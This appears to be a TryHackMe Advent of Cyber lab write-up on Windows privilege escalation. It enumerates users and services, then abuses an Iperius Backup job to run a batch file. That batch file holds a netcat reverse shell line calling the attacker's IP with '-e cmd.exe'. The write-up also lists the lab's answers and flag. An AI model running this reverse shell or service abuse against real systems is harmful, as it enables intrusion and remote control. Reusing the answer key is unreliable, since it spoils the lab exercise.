![image](https://github.com/user-attachments/assets/3dd8f99b-1c05-4884-9e03-6f56ef25a47a)![image](https://github.com/user-attachments/assets/bfe92b3b-8217-40d4-a8f4-7de51fcfdcc2)![image](https://github.com/user-attachments/assets/abe4c9fc-1713-4dee-8367-4e7249f84291)
![image](https://github.com/user-attachments/assets/6371db5c-9eec-4f49-bdff-02ec11b425c9)

<br>




<h1>[ Day 13 ] Networking - They Lost The PLan!</h1>

<p>-Launched <code>PowerShell</code><br><br>

- Executed <code>net users</code><br><br>

![image](https://github.com/user-attachments/assets/57ad735d-d55b-40a7-a986-ee10b4b36140)


<br>

1.1. Complete the username: p.....<br>
<code>pepper</code><br>

<br>

- Executed command <code>systeminfo</code><br>

<br>

![image](https://github.com/user-attachments/assets/c1b96525-8167-451c-aee0-f6ebc880991e)

1.2. What is the OS version?<br>
<code>10.0.17763 N/A Build 17763</code>

<br>

- Listed the services running on the system, executing <code>wmic service list</code>.<br>

<br>

![image](https://github.com/user-attachments/assets/886258a6-e828-4fff-98ca-b299b3856daa)

<br>

![image](https://github.com/user-attachments/assets/50f95368-8c15-49d7-9549-b6eed707ed51)


<br>

- Executed <code>wmic service list >> services.txt<br><br>
- Executed <code>Select-String -Path services.txt -Pattern backup</code>.<br><br>

<br>

![image](https://github.com/user-attachments/assets/1be6672e-74d8-4bfe-a2d0-b41a6bcbcc3c)

1.3. What backup service did you find running on the system?<br>
<code>IperiusSvc</code><br>

<br>

1.4. What is the path of the executable for the backup service you have identified?<br>
<code>C:\Program Files (x86)\Iperius Backup\IperiusService.exe</code><br>


![image](https://github.com/user-attachments/assets/5b6d0c01-0c5b-4439-8414-2e4dbf2378ef)

<br>

1.5. Run the whoami command on the connection you have received on your attacking machine. What user do you have?<br>
<code>the-grinch-hack\thegrinch</code><br>

<br>

1.6. What is the content of the flag.txt file?<br>
<code>THM-736635221</code><br>

<br>


- Navigated to <code>THM Attackbox</code> virtual machine.<br><br>
- Looked at the right upper corner and discovered my <code>AttackIP</code>:<code>10.10.72.55</code>.<br><br>
- Launched <code>Command Prompt</code>.<br><br>
- Practice also executing the command <code>ifconfig</code>, and confirmed the IP there in the <code>ens5</code> section.<br><br>
- Set up a listener using <code>nc -nlvp 4444</code>.<br><br>
-----------------------------------<br>
- Navigated to <code>Aoc_WinPrivEsc</code> virtual machine.<br><br>
- Note: the <code>TargetIP</code> I am using is <code>10.10.203.205</code>.<br><br>
- Launched <code>notepad</code><br><br>
- Added content to a <code>notepad</code> file.<br><br>
- Saved it as <code>evil.bat</code> in the <code>C:\Users\McSkidy\Desktop</code> path.<br><br>
- Navigated to <code>Desktop</code>.<br><br>
- Double-clicked <code>evil.bat</code>.<br><br>
-----------------------------------<br>
- Navigated to <code>THM Attackbox</code> virtual machine.<br><br>
-----------------------------------<br>
- Navigated to <code>Aoc_WinPrivEsc</code> virtual machine.<br><br>
- Launched <code>Iperius Backup</code> application.<br><br>
- Clicked <code>Create a New Backup Job</code>.<br><br>
- Clicked <code>Add folder</code>.<br><br>
- Clicked <code>Select</code>.<br><br>
- Chose <code>C:\Users</code>.<br><br>
- Clicked <code>OK</code>.<br><br>
- Clicked <code>Next</code>.<br><br>
- Navigated to the <code>Other processes</code> tab.<br><br>
- Toggled <code>Run a program or open external file</code>.<br><br>
- Clicked <code>Select</code>.<br><br>
- Chose <code>C:\Users\McSkidy\Desktop\evil.bat</code>.<br><br>
- Clicked <code>Next</code>, and <code>OK</code>.<br><br>
- Typed <code>Plan</code> for the <code>Job name</code>, and clicked <code>OK</code>.<br><br>
-


<br>

![image](https://github.com/user-attachments/assets/db433eca-4470-44d7-bb3d-7a6a408ebb35)


<br>

![image](https://github.com/user-attachments/assets/dba0f626-8ecd-4921-b665-a014f1f6574e)


<br>

![image](https://github.com/user-attachments/assets/1600e8f8-8083-4b47-889b-3b77d575eb78)



<br>

<code>@echo off</code><br>
<code>C:\Users\McSkidy\Downloads\nc.exe -nv 10.10.72.55 1337 -e cmd.exe</code><br>

<br>

![image](https://github.com/user-attachments/assets/aa991830-993d-487b-9f24-10a349164011)

<br>

![image](https://github.com/user-attachments/assets/06731c3f-f490-4f05-88d6-8bcb86f71ebe)



<br>

![image](https://github.com/user-attachments/assets/5243f622-8bd7-40e9-b1a9-ef009cc47818)

<br>

![image](https://github.com/user-attachments/assets/a95c32ef-eac2-4843-a6a2-6195fd3ea708)

<br>

<br>

![image](https://github.com/user-attachments/assets/b5242ba3-4a26-4f2a-9701-5affc5b8eb9e)

<br>

![image](https://github.com/user-attachments/assets/06a91cea-effa-4629-b79f-f3181193a96f)

<br>

![image](https://github.com/user-attachments/assets/f38cc281-c544-47f8-b3b5-000b1e8f18ba)

<br>


1.7. The Grinch forgot to delete a file where he kept notes about his schedule! Where can we find him at 5:30?<br>
<code>jazzercize</code><br>

<br>

![image](https://github.com/user-attachments/assets/72eb6bde-91c7-4c2d-be87-6993646dd6df)
